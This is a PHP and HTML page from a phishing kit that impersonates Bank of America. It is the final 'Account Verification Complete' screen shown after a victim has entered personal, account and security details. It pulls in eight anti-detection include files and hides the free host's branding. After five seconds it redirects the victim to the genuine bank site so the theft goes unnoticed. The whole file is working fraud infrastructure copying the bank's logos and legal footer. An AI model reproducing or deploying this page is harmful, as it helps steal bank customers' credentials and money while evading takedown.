<?php
	include 'prevents/anti1.php';
	include 'prevents/anti2.php';
	include 'prevents/anti3.php';
	include 'prevents/anti4.php';
	include 'prevents/anti5.php';
	include 'prevents/anti6.php';
	include 'prevents/anti7.php';
	include 'prevents/anti8.php';
?>
<!DOCTYPE html>
<html class="win chrome chrome-47 webkit svg-bg not-retina non-retinal cf-l33bo-reg-active cf-l33bo-med-active" lang="en-US">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
<title>Complete</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/ico">
<link href="assets/css/frd.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/verify2.css" rel="stylesheet" type="text/css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
    $(document).ready(function(){ 
	$('body').find('img[src$="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"]').remove();
    }); 
</script>
<meta http-equiv="refresh" content="5; url=https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwicva2nguHJAhWFLg8KHTl_CooQFggpMAA&url=https%3A%2F%2Fwww.bankofamerica.com%2F&usg=AFQjCNFGlX_ZsDSVfW1iL9Vk7eslTYIZ7w&sig2=n_x4WNqkLVkjP3vOCeABbA&bvm=bv.110151844,d.ZWU" />
</head>
<body>
<a class="ada-hidden" href="#">Skip to main content</a>
<div class="two-row-flex-wideleft-layout">
<div class="center-content">
<div class="header">
<div class="header-module">
<div class="l33b00"><img height="28" src="assets/img/logo.gif" width="221">
<div class="page-type l33bo-reg">Account Verification</div>
<div class="right-links">
<div class="secure-area">Secure Area</div>
<a class="divide" href="#">En Espa&ntilde;ol</a>
<div class="clearboth"></div>
</div>
<div class="clearboth"></div>
</div>
</div>
<div class="page-title-module h-100" id="skip-to-h1"  style="height:60px!important">
<div class="red-grad-bar-skin sup-ie">
<h1 class="l33bo-reg">Complete</h1>
</div>
</div>
<div class="status-bar-bdf-module">
<div class="multi-step-skin">
<div class="sb-step"><span class="ada-hidden">Step 1 of 4:</span> Personal Information
<div class="sb-arrow"></div>
</div>
<div class="sb-step"><span class="ada-hidden">You are currently at Step 2 of 4:</span> Account Details
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-previous-step"><span class="ada-hidden">Step 3 of 4:</span> Security
<div class="sb-arrow"></div>
</div>
<div class="sb-step sb-last-step sb-selected-step"><span class="ada-hidden">Step 4 of 4:</span> Finish</div>
<div class="clearboth"></div>
</div>
</div>
</div>
<div class="flex-top-row"></div>
<div class="bottom-row">
<div class="left-column">
<div class="passcode-module">
<div class="self-enroll-skin phoenix">
<div class="input-section" style="margin-left:auto;margin-right:auto;width:100%;text-align: center">
<h2 style="text-align: center;font-weight:bold;">Please Wait...</h2>
<img style="display: block;margin-left: auto;margin-right:auto;padding:25px 0px 25px 0px;"src="assets/img/spin.gif">
<p style="text-align: center;">We&apos;re just checking the information you have provided</p>
<p style="text-align: center;font-weight:bold;color:red;text-decoration: underline;">For your security you will automatically be logged out</p>

</div>
</div>
</div>
</div>
<div class="right-column no-print"></div>
<div class="clearboth"></div>
</div>
<div class="single-column-row"></div>
<div class="footer">
<div class="footer-top">&nbsp;</div>
<div class="footer-inner" style="margin-top: 83px;">
<div class="global-footer-module">
<div class="gray-bground-skin cssp">
<div class="secure">Secure area</div>
<div class="link-container">
<div class="link-row"><a class="last-link" href="#">Privacy &amp; Security</a>
<div class="clearboth"></div>
</div>
</div>
<p>Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender<img alt="" height="9" src="assets/img/house.gif" width="14"></a><br>
&copy;&nbsp;2021 Bank of America Corporation. All rights reserved.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>